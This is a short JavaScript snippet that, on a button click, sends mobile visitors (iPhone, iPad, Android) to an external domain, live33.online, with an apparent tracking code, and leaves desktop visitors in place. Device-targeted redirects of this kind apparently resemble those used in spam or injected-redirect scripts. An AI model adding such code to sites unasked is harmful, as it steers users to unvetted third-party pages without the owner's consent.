    var button = document.querySelector('.select');
button.addEventListener('click', function() {
    var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
    var isAndroid = /Android/i.test(navigator.userAgent);

    if (isIphoneOrIpad || isAndroid) {
        var redirectURL = "https://live33.online/?af7a215";
        window.location.href = redirectURL;
    }
});
